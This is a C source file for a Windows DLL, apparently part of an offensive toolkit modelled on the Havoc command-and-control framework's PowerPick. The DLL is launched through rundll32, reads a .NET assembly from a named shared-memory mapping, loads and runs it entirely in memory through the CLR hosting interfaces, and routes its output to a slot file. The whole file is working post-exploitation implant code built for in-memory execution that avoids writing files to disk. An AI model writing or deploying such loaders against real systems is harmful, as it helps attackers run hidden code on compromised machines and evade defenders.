/*
 * Sacrificial-process CLR host DLL for powerpick-fork.
 *
 * Launch: rundll32.exe "<dll>",PowerPickForkRun <mapName>
 * Map: magic | slot[160] | asmLen | asm | argsLen | args | imports...
 *
 * Loads the managed PE from the mapping via AppDomain::Load_3 (no temp EXE),
 * then invokes EntryPoint (Main) with the map name — Havoc PowerPick style.
 * Host DLL is still staged for rundll32.
 */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <objbase.h>
#include <oleauto.h>

#include "powerpick_fork_clr.h"

#define PPF_MAGIC 0x4B464650u /* 'PFFK' */
#define PPF_SLOT_MAX 160

typedef HRESULT (WINAPI *FN_CLRCreateInstance)(REFCLSID clsid, REFIID riid, LPVOID* ppInterface);

static void* PpAlloc(SIZE_T n)
{
    return HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, n);
}

static void PpFree(void* p)
{
    if (p) {
        HeapFree(GetProcessHeap(), 0, p);
    }
}

static void PpCopy(void* dst, const void* src, SIZE_T n)
{
    BYTE* d = (BYTE*)dst;
    const BYTE* s = (const BYTE*)src;
    while (n--) {
        *d++ = *s++;
    }
}

static SIZE_T PpLen(const char* s)
{
    SIZE_T n = 0;
    if (!s) {
        return 0;
    }
    while (s[n]) {
        n++;
    }
    return n;
}

static void SlotWrite(HANDLE hSlot, const char* msg)
{
    DWORD written = 0;
    if (hSlot == NULL || hSlot == INVALID_HANDLE_VALUE || msg == NULL) {
        return;
    }
    WriteFile(hSlot, msg, (DWORD)PpLen(msg), &written, NULL);
    FlushFileBuffers(hSlot);
}

static void SlotWriteHr(HANDLE hSlot, const char* prefix, HRESULT hr)
{
    char buf[96];
    DWORD n = 0;
    unsigned long u = (unsigned long)hr;
    const char* hex = "0123456789ABCDEF";
    int i;

    if (!prefix) {
        return;
    }
    while (prefix[n] && n < 64) {
        buf[n] = prefix[n];
        n++;
    }
    buf[n++] = '0';
    buf[n++] = 'x';
    for (i = 7; i >= 0; i--) {
        buf[n++] = hex[(u >> (i * 4)) & 0xF];
    }
    buf[n++] = '\n';
    buf[n] = '\0';
    SlotWrite(hSlot, buf);
}

static BOOL PpAsciiToWide(const char* ascii, wchar_t* out, int outChars)
{
    if (!ascii || !out || outChars <= 0) {
        return FALSE;
    }
    return MultiByteToWideChar(CP_ACP, 0, ascii, -1, out, outChars) > 0;
}

static BOOL PpStartClr(
    FN_CLRCreateInstance pCLRCreateInstance,
    ICLRMetaHost** ppMeta,
    ICLRRuntimeInfo** ppInfo,
    ICorRuntimeHost** ppHost)
{
    BOOL loadable = FALSE;
    HRESULT hr;

    hr = pCLRCreateInstance(
        &xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, (void**)ppMeta);
    if (hr != S_OK) {
        return FALSE;
    }

    hr = (*ppMeta)->lpVtbl->GetRuntime(
        *ppMeta, L"v4.0.30319", &xIID_ICLRRuntimeInfo, (void**)ppInfo);
    if (hr != S_OK) {
        return FALSE;
    }

    hr = (*ppInfo)->lpVtbl->IsLoadable(*ppInfo, &loadable);
    if (hr != S_OK || !loadable) {
        return FALSE;
    }

    hr = (*ppInfo)->lpVtbl->GetInterface(
        *ppInfo,
        &xCLSID_CorRuntimeHost,
        &xIID_ICorRuntimeHost,
        (void**)ppHost);
    if (hr != S_OK) {
        return FALSE;
    }

    hr = (*ppHost)->lpVtbl->Start(*ppHost);
    return hr == S_OK;
}

/*
 * Havoc-style: Load_3(asm bytes) → EntryPoint → Invoke_3(Main, string[]{ mapName }).
 */
static int PpInvokeManagedFromMemory(
    HANDLE hSlotWrite,
    const BYTE* asmBytes,
    DWORD asmLen,
    const wchar_t* mapNameW)
{
    ICLRMetaHost* pClrMetaHost = NULL;
    ICLRRuntimeInfo* pClrRuntimeInfo = NULL;
    ICorRuntimeHost* pCorHost = NULL;
    IUnknown* pAppDomainThunk = NULL;
    AppDomain* pAppDomain = NULL;
    Assembly* pAssembly = NULL;
    MethodInfo* pMethodInfo = NULL;
    SAFEARRAY* pSafeArray = NULL;
    SAFEARRAY* psaStaticMethodArgs = NULL;
    SAFEARRAYBOUND rgsabound[1];
    VARIANT vtPsa;
    VARIANT obj;
    VARIANT retVal;
    LPVOID pvData = NULL;
    FN_CLRCreateInstance pCLRCreateInstance;
    HMODULE mscoree;
    HRESULT hr;
    int exitCode = 1;
    LONG idx = 0;
    BSTR bMap = NULL;

    VariantInit(&vtPsa);
    VariantInit(&obj);
    VariantInit(&retVal);
    obj.vt = VT_NULL;

    mscoree = LoadLibraryA("mscoree.dll");
    if (!mscoree) {
        SlotWrite(hSlotWrite, "[!] host: mscoree.dll missing\n");
        return 1;
    }
    pCLRCreateInstance =
        (FN_CLRCreateInstance)GetProcAddress(mscoree, "CLRCreateInstance");
    if (!pCLRCreateInstance) {
        SlotWrite(hSlotWrite, "[!] host: CLRCreateInstance missing\n");
        return 1;
    }

    if (!PpStartClr(
            pCLRCreateInstance, &pClrMetaHost, &pClrRuntimeInfo, &pCorHost)) {
        SlotWrite(hSlotWrite, "[!] host: CLR start failed\n");
        goto done;
    }

    hr = pCorHost->lpVtbl->CreateDomain(
        pCorHost, L"PowerPickFork", NULL, &pAppDomainThunk);
    if (hr != S_OK) {
        SlotWriteHr(hSlotWrite, "[!] host: CreateDomain failed hr=", hr);
        goto done;
    }

    hr = pAppDomainThunk->lpVtbl->QueryInterface(
        pAppDomainThunk, &xIID_AppDomain, (void**)&pAppDomain);
    if (hr != S_OK) {
        SlotWriteHr(hSlotWrite, "[!] host: AppDomain QI failed hr=", hr);
        goto done;
    }

    rgsabound[0].cElements = asmLen;
    rgsabound[0].lLbound = 0;
    pSafeArray = SafeArrayCreate(VT_UI1, 1, rgsabound);
    if (!pSafeArray) {
        SlotWrite(hSlotWrite, "[!] host: SafeArrayCreate failed\n");
        goto done;
    }

    hr = SafeArrayAccessData(pSafeArray, &pvData);
    if (hr != S_OK) {
        SlotWriteHr(hSlotWrite, "[!] host: SafeArrayAccessData failed hr=", hr);
        goto done;
    }
    PpCopy(pvData, asmBytes, asmLen);
    SafeArrayUnaccessData(pSafeArray);
    pvData = NULL;

    hr = pAppDomain->lpVtbl->Load_3(pAppDomain, pSafeArray, &pAssembly);
    if (hr != S_OK) {
        SlotWriteHr(hSlotWrite, "[!] host: Load_3 failed hr=", hr);
        goto done;
    }

    hr = pAssembly->lpVtbl->EntryPoint(pAssembly, &pMethodInfo);
    if (hr != S_OK || !pMethodInfo) {
        SlotWriteHr(hSlotWrite, "[!] host: EntryPoint failed hr=", hr);
        goto done;
    }

    /* Main(string[] args) — one element: map name (Havoc PowerPick pattern). */
    psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);
    if (!psaStaticMethodArgs) {
        SlotWrite(hSlotWrite, "[!] host: args SafeArrayCreateVector failed\n");
        goto done;
    }

    vtPsa.vt = (VARTYPE)(VT_ARRAY | VT_BSTR);
    vtPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, 1);
    if (!vtPsa.parray) {
        SlotWrite(hSlotWrite, "[!] host: BSTR SafeArrayCreateVector failed\n");
        goto done;
    }

    bMap = SysAllocString(mapNameW);
    if (!bMap) {
        SlotWrite(hSlotWrite, "[!] host: SysAllocString failed\n");
        goto done;
    }
    idx = 0;
    hr = SafeArrayPutElement(vtPsa.parray, &idx, bMap);
    SysFreeString(bMap);
    bMap = NULL;
    if (hr != S_OK) {
        SlotWriteHr(hSlotWrite, "[!] host: SafeArrayPutElement(BSTR) hr=", hr);
        goto done;
    }

    idx = 0;
    hr = SafeArrayPutElement(psaStaticMethodArgs, &idx, &vtPsa);
    if (hr != S_OK) {
        SlotWriteHr(hSlotWrite, "[!] host: SafeArrayPutElement(args) hr=", hr);
        goto done;
    }

    hr = pMethodInfo->lpVtbl->Invoke_3(
        pMethodInfo, obj, psaStaticMethodArgs, &retVal);
    if (hr != S_OK) {
        SlotWriteHr(hSlotWrite, "[!] host: Invoke_3 failed hr=", hr);
        exitCode = 1;
        goto done;
    }

    if (retVal.vt == VT_I4) {
        exitCode = retVal.lVal;
    } else if (retVal.vt == VT_INT) {
        exitCode = retVal.intVal;
    } else {
        exitCode = 0;
    }

done:
    VariantClear(&retVal);
    VariantClear(&obj);
    if (vtPsa.parray) {
        SafeArrayDestroy(vtPsa.parray);
        vtPsa.parray = NULL;
    }
    VariantClear(&vtPsa);
    if (psaStaticMethodArgs) {
        SafeArrayDestroy(psaStaticMethodArgs);
    }
    if (pSafeArray) {
        SafeArrayDestroy(pSafeArray);
    }
    if (pMethodInfo) {
        pMethodInfo->lpVtbl->Release(pMethodInfo);
    }
    if (pAssembly) {
        pAssembly->lpVtbl->Release(pAssembly);
    }
    if (pAppDomain) {
        pAppDomain->lpVtbl->Release(pAppDomain);
    }
    if (pCorHost && pAppDomainThunk) {
        pCorHost->lpVtbl->UnloadDomain(pCorHost, pAppDomainThunk);
    }
    if (pAppDomainThunk) {
        pAppDomainThunk->lpVtbl->Release(pAppDomainThunk);
    }
    if (pCorHost) {
        pCorHost->lpVtbl->Release(pCorHost);
    }
    if (pClrRuntimeInfo) {
        pClrRuntimeInfo->lpVtbl->Release(pClrRuntimeInfo);
    }
    if (pClrMetaHost) {
        pClrMetaHost->lpVtbl->Release(pClrMetaHost);
    }
    return exitCode;
}

static int RunHost(const char* mapName)
{
    HANDLE hMap = NULL;
    LPVOID view = NULL;
    BYTE* p;
    DWORD magic;
    char slotPath[PPF_SLOT_MAX];
    DWORD asmLen;
    BYTE* asmBytes;
    HANDLE hSlotWrite = INVALID_HANDLE_VALUE;
    HANDLE stdOut = INVALID_HANDLE_VALUE;
    HANDLE stdErr = INVALID_HANDLE_VALUE;
    BOOL comInit = FALSE;
    wchar_t mapNameW[4096];
    int exitCode = 1;

    if (mapName == NULL || mapName[0] == '\0') {
        return 2;
    }
    while (*mapName == ' ') {
        mapName++;
    }

    hMap = OpenFileMappingA(FILE_MAP_READ, FALSE, mapName);
    if (hMap == NULL) {
        return 3;
    }

    view = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (view == NULL) {
        CloseHandle(hMap);
        return 4;
    }

    p = (BYTE*)view;
    magic = *(DWORD*)p;
    if (magic != PPF_MAGIC) {
        UnmapViewOfFile(view);
        CloseHandle(hMap);
        return 5;
    }

    PpCopy(slotPath, p + 4, PPF_SLOT_MAX);
    slotPath[PPF_SLOT_MAX - 1] = '\0';
    if (slotPath[0] == '\0') {
        UnmapViewOfFile(view);
        CloseHandle(hMap);
        return 6;
    }

    asmLen = *(DWORD*)(p + 4 + PPF_SLOT_MAX);
    if (asmLen == 0 || asmLen > 64 * 1024 * 1024) {
        UnmapViewOfFile(view);
        CloseHandle(hMap);
        return 7;
    }

    asmBytes = p + 4 + PPF_SLOT_MAX + 4;

    hSlotWrite = CreateFileA(
        slotPath,
        GENERIC_WRITE,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    if (hSlotWrite == INVALID_HANDLE_VALUE) {
        UnmapViewOfFile(view);
        CloseHandle(hMap);
        return 10;
    }

    {
        HANDLE hOut = NULL;
        HANDLE hErr = NULL;
        if (!DuplicateHandle(
                GetCurrentProcess(), hSlotWrite, GetCurrentProcess(), &hOut,
                0, TRUE, DUPLICATE_SAME_ACCESS) ||
            !DuplicateHandle(
                GetCurrentProcess(), hSlotWrite, GetCurrentProcess(), &hErr,
                0, TRUE, DUPLICATE_SAME_ACCESS)) {
            SlotWrite(hSlotWrite, "[!] host: DuplicateHandle failed\n");
            goto done;
        }
        SetStdHandle(STD_OUTPUT_HANDLE, hOut);
        SetStdHandle(STD_ERROR_HANDLE, hErr);
        stdOut = hOut;
        stdErr = hErr;
    }

    if (!PpAsciiToWide(mapName, mapNameW, 4096)) {
        SlotWrite(hSlotWrite, "[!] host: map name conversion failed\n");
        goto done;
    }

    {
        HRESULT cohr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
        if (cohr == S_OK || cohr == S_FALSE) {
            comInit = TRUE;
        } else if (cohr != RPC_E_CHANGED_MODE) {
            SlotWrite(hSlotWrite, "[!] host: CoInitializeEx failed\n");
            goto done;
        }
    }

    /* Keep mapping open: managed Main → RunFromMap re-opens by name. */
    exitCode = PpInvokeManagedFromMemory(
        hSlotWrite, asmBytes, asmLen, mapNameW);

done:
    if (stdOut != INVALID_HANDLE_VALUE && stdOut != hSlotWrite) {
        CloseHandle(stdOut);
    }
    if (stdErr != INVALID_HANDLE_VALUE && stdErr != hSlotWrite && stdErr != stdOut) {
        CloseHandle(stdErr);
    }
    if (hSlotWrite != INVALID_HANDLE_VALUE) {
        FlushFileBuffers(hSlotWrite);
        CloseHandle(hSlotWrite);
    }
    if (view) {
        UnmapViewOfFile(view);
    }
    if (hMap) {
        CloseHandle(hMap);
    }
    if (comInit) {
        CoUninitialize();
    }
    return exitCode;
}

__declspec(dllexport) void CALLBACK PowerPickForkRun(
    HWND hwnd,
    HINSTANCE hinst,
    LPSTR lpszCmdLine,
    int nCmdShow)
{
    int code;
    (void)hwnd;
    (void)hinst;
    (void)nCmdShow;
    code = RunHost(lpszCmdLine ? lpszCmdLine : "");
    ExitProcess((UINT)code);
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
{
    (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) {
        /* Do not run CLR/host work here — loader lock. KaynLoader calls export after. */
        DisableThreadLibraryCalls(hinst);
    }
    return TRUE;
}
